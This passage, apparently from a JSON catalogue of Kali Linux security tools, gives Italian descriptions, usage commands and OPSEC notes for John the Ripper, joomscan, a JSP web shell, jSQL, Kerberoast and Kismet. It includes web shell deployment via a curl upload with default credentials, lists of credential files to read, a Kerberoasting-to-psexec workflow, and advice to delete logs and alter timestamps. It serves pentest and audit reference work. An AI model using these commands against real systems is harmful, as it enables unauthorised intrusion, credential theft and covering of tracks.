Kerberoast (TGS-REP)\njohn --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt\n\n# AS-REP roasting\njohn --format=krb5asrep --wordlist=rockyou.txt asrep.txt\n\n# ZIP password\nzip2john protected.zip > zip.hash\njohn --wordlist=rockyou.txt zip.hash\n\n# Office documents\noffice2john document.docx > office.hash\njohn --wordlist=rockyou.txt office.hash\n\n# SSH private key\nssh2john id_rsa > ssh.hash\njohn --wordlist=rockyou.txt ssh.hash\n\n# === PERFORMANCE ===\n# Multi-thread (fork)\njohn --fork=8 --wordlist=rockyou.txt hashes.txt\n\n# Benchmark formati\njohn --test\njohn --test --format=bcrypt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Penetration Testing</strong>, dopo aver estratto hash (da SAM, NTDS.dit, /etc/shadow, database dump), John è lo strumento primario per recuperare le password in chiaro. Le password craccate permettono accesso a sistemi, lateral movement, e privilege escalation.</p><p>Per <strong>Password Audit Aziendali</strong>, verifica la robustezza delle password degli utenti contro attacchi offline. Un audit periodico identifica password deboli prima che un attaccante le sfrutti. Report mostra percentuale di password craccabili e tempo necessario.</p><p>Durante <strong>Forensic Investigations</strong>, recupero di password per accedere a dispositivi sequestrati, file criptati, o account di interesse investigativo. John supporta formati forensi comuni come FileVault, LUKS, VeraCrypt.</p><p>Per <strong>Kerberoasting e AD Attacks</strong>, dopo aver estratto TGS-REP o AS-REP tickets, John li cracca offline per ottenere password di service account. Questi account spesso hanno privilegi elevati e password mai cambiate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completely Offline:</strong> John opera interamente in locale senza traffico di rete. Gli hash vengono processati sulla macchina dell'attacker. Nessun rischio di detection sul target durante il cracking.</p><p><strong>john.pot File:</strong> Tutte le password craccate vengono salvate in ~/.john/john.pot. Questo file contiene credenziali in chiaro e deve essere protetto. Considerare encryption o secure deletion dopo l'engagement.</p><p><strong>Resource Intensive:</strong> Cracking intensivo usa 100% CPU (o GPU). Su laptop può causare throttling termico. Per hash lenti (bcrypt, scrypt), anche hardware potente richiede tempo significativo.</p><p><strong>Legal Considerations:</strong> Possedere password craccate di terzi può avere implicazioni legali. Documentare autorizzazione per il cracking. Gestire i risultati secondo policy di data handling dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "joomscan",
    "name": "joomscan",
    "version": "0.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/joomscan/",
    "desc": "Scanner vulnerabilità specifico per Joomla CMS con detection di componenti e versioni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JoomScan</strong> (Joomla Vulnerability Scanner) è uno scanner di sicurezza specializzato esclusivamente per il CMS Joomla, sviluppato dal team OWASP. A differenza di scanner web generici, JoomScan conosce intimamente l'architettura di Joomla e può identificare con precisione: versione core esatta, componenti/plugin/template installati, configurazioni insicure specifiche del CMS, e vulnerabilità note sia nel core che nelle estensioni. Il database delle vulnerabilità viene aggiornato regolarmente dal team OWASP, includendo CVE, exploit pubblici, e configurazioni problematiche specifiche di Joomla.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Precise Version Detection:</strong> Identifica la versione esatta di Joomla analizzando molteplici indicatori: file XML di manifest, meta generator, file di sistema, e pattern specifici. Funziona anche quando l'admin ha tentato di nascondere la versione.</p><p><strong>Component Enumeration:</strong> Enumera componenti, moduli, plugin, e template installati. Identifica estensioni third-party che spesso rappresentano il vettore d'attacco principale su installazioni Joomla.</p><p><strong>Vulnerability Database:</strong> Confronta versioni identificate con database OWASP di vulnerabilità note. Segnala CVE applicabili, exploit disponibili, e severity rating per prioritizzare remediation.</p><p><strong>Configuration Analysis:</strong> Verifica misconfigurazioni comuni: directory listing abilitato, file di backup esposti, debug mode attivo, .htaccess mancanti, e permessi file errati che espongono informazioni sensibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>JoomScan è scritto in Perl e offre opzioni per customizzare lo scan.</p><pre><code># Scan completo standard\njoomscan -u https://target.com\n\n# Enumeration approfondita dei componenti\njoomscan -u https://target.com -ec\njoomscan -u https://target.com --enumerate-components\n\n# Scan con proxy (per Burp/ZAP intercept)\njoomscan -u https://target.com --proxy http://127.0.0.1:8080\n\n# User-Agent custom per evitare WAF basic\njoomscan -u https://target.com -a \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0\"\n\n# Scan con cookie di sessione autenticata\njoomscan -u https://target.com --cookie \"session=abc123\"\n\n# Output in file\njoomscan -u https://target.com -o report.txt\n\n# Specificare random user-agent\njoomscan -u https://target.com -r\n\n# Scan multipli target da file\nfor url in $(cat joomla_sites.txt); do joomscan -u $url -o \"${url//\\//_}.txt\"; done</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Web Application Penetration Testing</strong>, quando viene identificato un sito Joomla, JoomScan è il primo tool da lanciare. Fornisce una mappa completa dell'installazione identificando tutti i possibili vettori d'attacco specifici del CMS.</p><p>Nel <strong>Bug Bounty</strong>, le estensioni Joomla third-party sono notoriamente vulnerabili. JoomScan enumera tutti i componenti installati permettendo di cercare vulnerabilità note o analizzare codice per trovare 0-day.</p><p>Per <strong>Security Audit Aziendali</strong>, verifica che installazioni Joomla corporate siano aggiornate e correttamente configurate. Il report dettagliato facilita la creazione di remediation plan con priorità basate su severity.</p><p>Durante <strong>Compliance Assessment</strong>, JoomScan verifica requisiti di sicurezza come versioni software aggiornate, configurazioni sicure, e assenza di vulnerabilità note richieste da standard come PCI-DSS per applicazioni web.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Fingerprinting:</strong> JoomScan genera molte richieste HTTP a path specifici di Joomla (/administrator/, /components/, /modules/, etc.). Pattern facilmente identificabile da WAF e sistemi di monitoring.</p><p><strong>User-Agent Detection:</strong> Il user-agent default contiene \"JoomScan\" ed è noto ai WAF. Sempre usare -a o -r per cambiare user-agent in operazioni dove la stealth è importante.</p><p><strong>Rate Limiting:</strong> Lo scan può essere rallentato o bloccato da rate limiting. Non c'è opzione built-in per delay tra richieste. Usare proxy con throttling se necessario.</p><p><strong>Log Footprint:</strong> Ogni richiesta viene loggata dal web server. Lo scan completo genera centinaia di entry di log con pattern riconoscibile. Considerare timing dello scan in periodi di alto traffico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "jsp-file-browser",
    "name": "jsp-file-browser",
    "version": "1.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jsp-file-browser/",
    "desc": "Web shell JSP con file browser grafico per navigazione filesystem su server Java.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>JSP File Browser è una web shell JSP progettata specificamente per server Java application (Tomcat, JBoss, WebLogic, GlassFish) che fornisce un'interfaccia grafica user-friendly per la post-exploitation. A differenza di semplici command shell, JSP File Browser offre un file manager completo con navigazione visuale del filesystem, upload/download di file, editing in-browser, e esecuzione di comandi di sistema. L'interfaccia web-based significa che non richiede connettività reverse (utile quando egress è filtrato) e funziona attraverso qualsiasi browser. Il design user-friendly lo rende accessibile anche a operatori meno tecnici, mentre le funzionalità complete permettono tutte le operazioni di post-exploitation comuni: exfiltration di dati, upload di tool aggiuntivi, modifica configurazioni, e pivot verso altre risorse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Visual File Browser:</strong> Interfaccia grafica point-and-click per navigare il filesystem del server. Mostra permessi, owner, dimensioni, e date di modifica. Supporta navigazione in qualsiasi directory accessibile al processo Java (spesso root del filesystem). Visualizza file nascosti e di sistema.</p><p><strong>File Transfer Bidirezionale:</strong> Upload di file dal browser al server e download dal server al client. Supporta file binari e di testo di qualsiasi dimensione. Utile per uploadare tool di post-exploitation, exfiltrare dati sensibili, o estrarre backup e configurazioni.</p><p><strong>In-Browser File Editor:</strong> Editor di testo integrato per modificare file direttamente sul server. Permette di modificare configurazioni, script, crontab, e altri file senza doverli scaricare e riuploadare. Syntax highlighting per formati comuni.</p><p><strong>Command Execution:</strong> Esecuzione di comandi di sistema con output visualizzato nel browser. Permette operazioni che non sono possibili tramite file manager come esecuzione script, gestione processi, network operations, e privilege escalation attempts.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === DEPLOYMENT ===\n# Metodo 1: Upload tramite vulnerabilità file upload\n# Trova form di upload, upload jsp-file-browser.jsp\n\n# Metodo 2: Deploy via manager (se credenziali note)\ncurl -u admin:admin --upload-file shell.war \\\n  \"http://target:8080/manager/text/deploy?path=/shell\"\n\n# Metodo 3: WAR deploy via JMX Console (JBoss)\n# Usa MainDeployer MBean per deploy\n\n# Metodo 4: Copia manuale se hai già accesso\ncp jsp-file-browser.jsp /var/lib/tomcat9/webapps/ROOT/\n\n# === ACCESSO ===\n# Accedi via browser\nhttps://target.com/app/jsp-file-browser.jsp\nhttps://target.com/shell/browser.jsp\n\n# === OPERAZIONI COMUNI ===\n# Navigazione: Click su directory per entrare\n# Upload: Seleziona file locale, click Upload\n# Download: Click su file, seleziona Download\n# Edit: Click su file di testo, modifica, Save\n# Delete: Seleziona file, click Delete\n# Create Dir: Specifica nome, click Create\n\n# === COMMAND EXECUTION ===\n# Nel campo comando:\nwhoami\nid\ncat /etc/passwd\nnetstat -tlnp\nps aux\nfind / -name \"*.conf\" 2>/dev/null\n\n# Privilege escalation check\nsudo -l\nfind / -perm -4000 2>/dev/null\n\n# === FILE DI INTERESSE ===\n# Configurazioni\n/opt/tomcat/conf/tomcat-users.xml\n/opt/tomcat/conf/context.xml\n/var/lib/tomcat9/webapps/*/WEB-INF/web.xml\n\n# Database credentials\n**/application.properties\n**/database.yml\n**/db.conf\n\n# Secrets\n.bash_history\n.ssh/id_rsa\n*.key\n*.pem</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation su Server Java</strong>, dopo aver ottenuto la possibilità di uploadare file JSP (tramite file upload vulnerability, WAR deploy, o accesso diretto), JSP File Browser fornisce un'interfaccia completa per esplorare il server. Più user-friendly di una reverse shell per operazioni di file management.</p><p>Durante <strong>Data Exfiltration</strong>, la funzionalità download permette di estrarre file sensibili dal server: backup database, configurazioni con credenziali, chiavi SSH, documenti business. Non richiede setup di server di exfiltration.</p><p>Per <strong>Lateral Movement Preparation</strong>, upload di tool aggiuntivi per scansione della rete interna, port forwarding, o exploitation di altri sistemi. La shell JSP serve come punto di pivot per attacchi successivi.</p><p>Nel <strong>Persistence Establishment</strong>, modifica configurazioni per mantenere accesso: aggiunta di utenti, modifica crontab, installazione di backdoor aggiuntive. L'editor integrato facilita queste modifiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>On-Disk Artifact:</strong> Il file JSP rimane sul filesystem del server ed è facilmente rilevabile da antivirus, file integrity monitoring, e security scan. Signature di web shell comuni sono note. Considerare obfuscation o custom shell.</p><p><strong>Access Logging:</strong> Ogni accesso alla shell viene loggato nei log del web server (access.log). Pattern di accesso ripetuti allo stesso JSP sono sospetti. I comandi eseguiti possono apparire in log se passati via GET.</p><p><strong>Web Application Firewall:</strong> WAF possono bloccare l'upload iniziale (signature di web shell) o le richieste successive (pattern di command injection). Potrebbero essere necessarie tecniche di evasion.</p><p><strong>Cleanup Essenziale:</strong> Rimuovere la shell dopo l'utilizzo. Eliminare anche log entries se possibile. Considerare timestamp manipulation per nascondere la presenza. Una shell dimenticata è un indicator of compromise permanente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "jsql",
    "name": "jsql",
    "version": "0.112",
    "icon": "../app/icons/jsql-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/jsql/",
    "desc": "GUI Java per SQL injection automatica con supporto per 33 database e tecniche avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>jSQL</strong> Injection è un'applicazione Java con interfaccia grafica per automatizzare attacchi SQL injection su applicazioni web. Supporta 33 database differenti tra cui MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, IBM DB2, Sybase, e molti altri. Il tool implementa tutte le principali tecniche di SQL injection: Union-based (estrazione rapida attraverso UNION SELECT), Error-based (extraction tramite messaggi di errore), Blind Boolean (inferenza bit-by-bit), Time-based (delay per confermare injection), e Out-of-Band (DNS/HTTP exfiltration). L'interfaccia grafica intuitiva permette anche a chi non è esperto di SQLi di esplorare database vulnerabili, mentre gli utenti avanzati possono customizzare ogni aspetto dell'attacco. Include utility aggiuntive come admin page finder, hash cracker, file reader/writer, e web shell upload.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Database Support:</strong> Supporta 33 database con sintassi specifiche ottimizzate per ciascuno. Auto-detection del tipo di database basato su fingerprinting di risposte ed errori. Gestisce correttamente quirk specifici come Oracle DUAL table, MSSQL stacked queries, e MySQL information_schema.</p><p><strong>Multiple Injection Techniques:</strong> Implementa tutte le tecniche principali: Union (veloce, richiede output visibile), Error-based (sfrutta messaggi di errore verbose), Blind Boolean (inferenza da risposte true/false), Time-based (SLEEP/WAITFOR per conferma cieca), Stacked queries (comandi multipli), e OOB (out-of-band via DNS o HTTP per ambienti filtrati).</p><p><strong>Database Browser Visuale:</strong> Una volta confermata l'injection, la GUI presenta una vista ad albero di databases, tabelle, e colonne. Click per enumerare struttura, doppio-click per estrarre dati. Export in vari formati (CSV, JSON, HTML) per analisi offline.</p><p><strong>Integrated Security Tools:</strong> Include tool aggiuntivi: Admin Page Finder (brute force di path amministrativi), Hash Cracker (dizionario e rainbow tables per hash comuni), File Reader (lettura file via SQLi come LOAD_FILE), Web Shell Upload (scrittura file se permessi lo consentono), e SQL Shell per query manuali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\n# Avvia interfaccia grafica\njsql\n\n# === WORKFLOW BASE ===\n# 1. INSERISCI URL VULNERABILE\n# Formato: http://target.com/page.php?id=1\n# jSQL testerà il parametro 'id' per injection\n\n# 2. DETECTION\n# Click pulsante 'Check' o premi Enter\n# jSQL testa automaticamente tutte le tecniche\n# Mostra tipo di injection e database rilevato\n\n# 3. ENUMERAZIONE\n# - Expand 'Databases' nella tree view\n# - Click su database per vedere tabelle\n# - Click su tabella per vedere colonne\n# - Check le colonne da estrarre\n\n# 4. ESTRAZIONE DATI\n# - Seleziona tabella e colonne\n# - Click 'Extract' o doppio-click\n# - I dati appaiono nel pannello risultati\n\n# === OPZIONI AVANZATE ===\n# Tab 'Preferences':\n# - Injection type: forza tecnica specifica\n# - Tampering: encoding per evasion WAF\n# - Proxy: configura Burp/ZAP intercept\n# - Threads: parallelizza extraction\n\n# Tab 'Request':\n# - Custom headers (cookies, auth)\n# - POST data invece di GET\n# - Method selection\n\n# === TOOL INTEGRATI ===\n# Admin Finder:\n# - Tab 'Admin page'\n# - Inserisci base URL\n# - Brute force path comuni\n\n# File Reader (se LOAD_FILE permesso):\n# - Tab 'File'\n# - Specifica path: /etc/passwd\n# - Leggi file dal server\n\n# Web Shell:\n# - Tab 'Upload'\n# - Se INTO OUTFILE permesso\n# - Upload shell PHP/JSP\n\n# === ESEMPIO COMPLETO ===\n# Target: http://vuln.com/news.php?id=1\n# 1. Inserisci URL in jSQL\n# 2. Check -> Detected: MySQL via Union\n# 3. Expand: information_schema -> users\n# 4. Select: username, password columns\n# 5. Extract -> Ottieni credenziali\n# 6. Hash cracker su password hash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Web Application Penetration Testing</strong>, jSQL è ideale quando viene identificata una SQL injection e si vuole estrarre dati rapidamente. La GUI elimina la necessità di costruire payload manualmente, accelerando significativamente l'exploitation di vulnerabilità confermate.</p><p>Per <strong>CTF e Learning</strong>, l'interfaccia visuale aiuta a comprendere come funzionano le diverse tecniche di SQL injection. Osservare i payload generati e le risposte del server è educativo per chi sta imparando SQLi.</p><p>Nel <strong>Bug Bounty</strong>, dopo aver identificato una potenziale SQLi durante reconnaissance, jSQL può rapidamente confermare la vulnerabilità e dimostrare l'impatto estraendo dati sensibili per il report.</p><p>Per <strong>Quick Exploitation</strong>, quando il tempo è limitato e si vuole estrarre dati da una injection nota, jSQL è più veloce di costruire payload manuali o configurare sqlmap da command line. L'interfaccia point-and-click riduce gli errori.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Traffic Volume:</strong> jSQL genera molte richieste HTTP durante detection e extraction. Ogni colonna estratta richiede multiple query. Il volume di traffico è facilmente distinguibile da comportamento utente normale.</p><p><strong>WAF Detection:</strong> I payload SQL injection sono ben noti ai WAF. jSQL include opzioni di tampering (encoding, case variation) ma WAF moderni possono comunque rilevare pattern. Testare prima con injection manuale semplice.</p><p><strong>Logging:</strong> Ogni query injection appare nei log applicativi e potenzialmente nei log database. Le query anomale con UNION SELECT, information_schema, o SLEEP sono altamente sospette.</p><p><strong>Error Messages:</strong> jSQL si basa su error messages per alcune tecniche. In produzione, gli errori sono spesso soppressi. Verificare che la tecnica appropriata sia selezionata per l'ambiente target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "kerberoast",
    "name": "kerberoast",
    "version": "0.0~git20221231.cc5aa6e",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/kerberoast/",
    "desc": "Script per Kerberoasting: richiede TGS per service account e cracca hash offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Kerberoast</strong> è un toolkit per eseguire attacchi Kerberoasting contro Active Directory, una delle tecniche più efficaci per ottenere credenziali di service account senza privilegi elevati. L'attacco sfrutta il meccanismo Kerberos: qualsiasi utente autenticato può richiedere un Ticket Granting Service (TGS) per qualsiasi servizio che ha un ServicePrincipalName (SPN) configurato. Il TGS è criptato con l'hash NTLM della password del service account, quindi può essere craccato offline senza generare ulteriore traffico verso il domain controller. Service account spesso hanno password deboli (mai cambiate, create manualmente) e privilegi elevati (admin su server, accesso a database). Un Kerberoast riuscito può fornire accesso significativo al dominio. Il toolkit include script per enumerare SPN, richiedere TGS, e formattare hash per cracking con John o Hashcat.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SPN Enumeration:</strong> Interroga Active Directory via LDAP per trovare tutti gli account utente con ServicePrincipalName configurato. Gli account computer hanno sempre SPN ma le loro password sono lunghe e random. Gli account utente con SPN (service account manuali) sono il target principale perché hanno password human-chosen.</p><p><strong>TGS Request Automatizzato:</strong> Una volta identificati i target, richiede TGS per ogni SPN al Domain Controller. Questa è un'operazione completamente legittima nel protocollo Kerberos - qualsiasi utente può richiedere TGS per qualsiasi servizio. Il DC non verifica se l'utente ha effettivamente bisogno del ticket.</p><p><strong>Hash Extraction e Formatting:</strong> Estrae la parte encrypted del TGS che contiene l'hash della password del service account. Formatta l'hash nel formato richiesto da John the Ripper (krb5tgs) o Hashcat (mode 13100/19600/19700 a seconda dell'encryption type).</p><p><strong>Multiple Attack Vectors:</strong> Supporta Kerberoasting standard (RC4), ma anche AES Kerberoasting (più lento da crackare ma più comune in ambienti moderni). Può fare targeted roasting (singolo account) o bulk roasting (tutti gli SPN trovati).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === KERBEROASTING CON IMPACKET ===\n# Enumera SPN e richiedi TGS (all-in-one)\nGetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.1 -request\n\n# Solo enumeration (no TGS request)\nGetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.1\n\n# Output in formato hashcat\nGetUserSPNs.py domain.com/user:password -dc-ip 10.10.10.1 -request -outputfile hashes.txt\n\n# Con hash NTLM invece di password\nGetUserSPNs.py domain.com/user -hashes :NTHASH -dc-ip 10.10.10.1 -request\n\n# === KERBEROASTING DA WINDOWS ===\n# Con Rubeus\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# Target specifico\nRubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt\n\n# Solo RC4 (più veloce da crackare)\nRubeus.exe kerberoast /rc4opsec /outfile:hashes.txt\n\n# Con PowerView\nInvoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt\n\n# === CRACKING ===\n# Hashcat (RC4 - TGS-REP etype 23)\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Hashcat (AES256 - TGS-REP etype 18)\nhashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# John the Ripper\njohn --format=krb5tgs --wordlist=rockyou.txt hashes.txt\n\n# Con regole per password complesse\nhashcat -m 13100 hashes.txt rockyou.txt -r best64.rule\n\n# === POST-EXPLOITATION ===\n# Usa password craccata\nsmbclient //server/share -U 'domain\\svc_sql' --password='CrackedPass123'\n\n# O per accesso WMI/PSExec\npsexec.py domain/svc_sql:CrackedPass123@target</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial Privilege Escalation in AD</strong>, Kerberoasting è spesso il primo passo dopo aver ottenuto credenziali di un utente normale. Service account tendono ad avere accesso amministrativo a server specifici (SQL, web, file server) e password più deboli di account utente protetti da policy.</p><p>Durante <strong>Red Team Operations</strong>, Kerberoasting permette escalation 'slow and quiet'. Le richieste TGS sono legittime e il cracking è completamente offline. Con password comuni, si possono ottenere credenziali privilegiate in minuti senza triggerare alert.</p><p>Nel <strong>Active Directory Security Assessment</strong>, Kerberoasting verifica la robustezza delle password dei service account. Un audit dovrebbe tentare di craccare tutti gli SPN per identificare account con password deboli prima che un attaccante lo faccia.</p><p>Per <strong>Lateral Movement</strong>, le credenziali dei service account spesso permettono accesso a sistemi specifici che l'utente compromesso inizialmente non poteva raggiungere. Da lì, ulteriore credential harvesting può portare a domain admin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>TGS Requests Logging:</strong> Ogni richiesta TGS genera Event ID 4769 nel Security log del Domain Controller. Richiedere TGS per molti SPN in poco tempo è anomalo e può triggerare detection rules. Considerare spreading delle richieste nel tempo.</p><p><strong>Legitimate Traffic:</strong> Una singola richiesta TGS è indistinguibile da uso legittimo. Il problema è la scala: un utente normale non richiede TGS per 50 servizi diversi. Target selettivi su SPN specifici sono meno sospetti.</p><p><strong>Offline Cracking:</strong> Una volta ottenuti i TGS, il cracking avviene completamente offline senza generare alcun traffico di rete. Questa fase è completamente invisibile al target. Solo il successo (uso delle credenziali) sarà rilevabile.</p><p><strong>Encryption Type Matters:</strong> TGS con RC4 (etype 23) sono molto più veloci da crackare rispetto ad AES (etype 18). Ambienti moderni forzano AES, rendendo il cracking più lungo ma non impossibile con hardware adeguato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kismet",
    "name": "kismet",
    "version": "2023.07.R2",
    "icon": "../app/icons/kismet-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/kismet/",
    "desc": "Wireless sniffer, IDS e wardriving tool con supporto WiFi, Bluetooth, SDR e Zigbee.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Kismet</strong> è il più completo e versatile wireless sniffer, network detector, e intrusion detection system passivo disponibile. A differenza di tool che si focalizzano solo su WiFi, Kismet supporta nativamente molteplici protocolli wireless: WiFi 802.11 (tutti gli standard da a/b/g fino a ax), Bluetooth (Classic e Low Energy), Software Defined Radio (RTL-SDR per varie frequenze), Zigbee, Z-Wave, DECT, e altri protocolli RF con hardware appropriato. L'architettura client-server con web UI moderna permette monitoraggio remoto e configurazione dinamica. Kismet opera in modalità completamente passiva, catturando traffico senza mai trasmettere, rendendolo virtualmente indetectable. Include funzionalità IDS per rilevare attacchi wireless (deauth flood, evil twin, probe attacks), integrazione GPS per wardriving con mapping geografico, e logging avanzato in formati multipli (kismet db, pcap, wiglecsv).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol Wireless Capture:</strong> Supporta simultaneamente capture da multiple interfacce e protocolli. Un singolo sistema Kismet può monitorare WiFi su più canali (con channel hopping o interfacce dedicate), Bluetooth con adapter compatibili, e SDR per frequenze arbitrarie. Ogni source contribuisce al database unificato di dispositivi rilevati.</p><p><strong>Comprehensive WiFi Analysis:</strong> Per WiFi, Kismet decodifica beacon, probe request/response, data frames (se non encrypted), e management frames. Identifica SSID (anche hidden), BSSID, canale, encryption type, vendor dei client, potenza del segnale, e traffico. Supporta tutti i tipi di encryption detection: Open, WEP, WPA, WPA2, WPA3.</p><p><strong>Wireless IDS Capabilities:</strong> Rileva automaticamente pattern di attacco: deauthentication flood, evil twin AP (stesso SSID, BSSID diverso), probe flooding, client isolation bypass, e altri attacchi wireless. Gli alert possono essere loggati, inviati a SIEM, o trigger script custom.</p><p><strong>GPS Integration e Wardriving:</strong> Integrazione nativa con gpsd per associare coordinate GPS ad ogni dispositivo rilevato. Export in formato Wigle per contribuzione al database globale. Supporta logging continuo per wardriving mobile con statistiche di coverage e signal mapping.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP INIZIALE ===\n# Prima esecuzione crea config e chiede username/password\nkismet\n# Accedi a http://localhost:2501 per completare setup\n\n# === AVVIO CON INTERFACCE ===\n# Interfaccia WiFi in monitor mode\nkismet -c wlan0\n\n# Multiple interfacce\nkismet -c wlan0 -c wlan1:name=second_wifi\n\n# Con Bluetooth\nkismet -c hci0:type=linuxbluetooth\n\n# Con RTL-SDR\nkismet -c rtl433-0:type=rtl433\n\n# === WEB INTERFACE ===\n# Accedi via browser (default credentials da setup)\nhttp://localhost:2501\n\n# Da remoto (bind su tutte le interfacce)\nkismet --override httpd_bind_address=0.0.0.0\n\n# === WARDRIVING CON GPS ===\n# Avvia gpsd\ngpsd /dev/ttyUSB0\n\n# Kismet con GPS\nkismet -c wlan0 --gps-gpsd\n\n# === LOGGING ===\n# Log in formato pcapng (compatibile Wireshark)\nkismet -c wlan0 --log-types pcapng,kismet\n\n# Log specifico per Wigle\nkismet -c wlan0 --log-types wiglecsv\n\n# Directory di log custom\nkismet -c wlan0 --log-prefix /data/wardriving/session1\n\n# === MONITOR MODE ===\n# Abilita monitor mode manualmente (se necessario)\nairmon-ng start wlan0\nkismet -c wlan0mon\n\n# O lascia a Kismet (potrebbe funzionare)\nkismet -c wlan0:hop=true,ht_channels=true\n\n# === ANALISI DATI ===\n# Kismet salva in SQLite database (.kismet file)\nsqlite3 Kismet-*.kismet\nSELECT * FROM devices WHERE type='Wi-Fi AP';\n\n# Export con kismetdb_strip_packets per file più piccoli\nkismetdb_strip_packets --in Kismet-*.kismet --out stripped.kismet</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wireless Security Assessment</strong>, Kismet fornisce una mappa completa dell'ambiente RF: tutti gli AP, i client associati, dispositivi in probe mode, e potenziali rogue AP. La modalità IDS rileva automaticamente attacchi in corso, mentre l'analisi passiva non altera il normale funzionamento della rete.</p><p>Durante <strong>Wardriving Professionale</strong>, Kismet con GPS crea dataset dettagliati di reti wireless con posizione geografica. I dati possono essere visualizzati su mappa, analizzati per coverage, o contribuiti a database pubblici come Wigle. Utile per survey di copertura o mapping per client.</p><p>Per <strong>IoT e RF Security Research</strong>, con SDR e adapter Zigbee/Z-Wave, Kismet può monitorare dispositivi IoT, sistemi domotici, sensori industriali, e altre comunicazioni RF. Identifica dispositivi, protocolli, e potenziali vulnerabilità in ecosistemi non-WiFi.</p><p>Nel <strong>Incident Response Wireless</strong>, quando si sospetta un attacco wireless (rogue AP, evil twin, credential harvesting via captive portal), Kismet può identificare rapidamente dispositivi anomali, confrontare con baseline note, e raccogliere evidence.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Completely Passive:</strong> Kismet in modalità standard non trasmette mai. Opera solo in ricezione, rendendolo virtualmente indetectable. Nessun probe request, nessun association, nessun traffico generato. L'unica traccia è fisica (presenza del dispositivo).</p><p><strong>Monitor Mode Requirements:</strong> Per cattura WiFi completa, l'interfaccia deve essere in monitor mode. Non tutti gli adapter lo supportano. In monitor mode, l'interfaccia non può essere usata per connessione normale simultaneamente.</p><p><strong>Data Sensitivity:</strong> I log Kismet contengono dati sensibili: MAC address di dispositivi (tracciabili), SSID che possono rivelare informazioni (nomi aziendali, indirizzi), e potenzialmente contenuto di pacchetti non criptati. Proteggere i file di log appropriatamente.</p><p><strong>Legal Considerations:</strong> In molte giurisdizioni, la cattura passiva di traffico wireless pubblicamente accessibile è legale. Tuttavia, registrare o analizzare contenuto di comunicazioni private può non esserlo. Verificare le leggi locali sulla intercettazione wireless.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "koadic",
    "name": "koadic",
    "version": "0~git20210412",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/koadic/",
    "desc": "C2 framework Windows che usa JScript/VBScript per post-exploitation via COM object.",
